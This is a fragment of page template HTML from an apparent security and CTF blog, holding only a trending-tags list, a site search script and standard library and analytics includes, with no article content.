justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/arm64/">arm64</a> <a class="post-tag" href="/tags/asm/">asm</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/keystone/">keystone</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
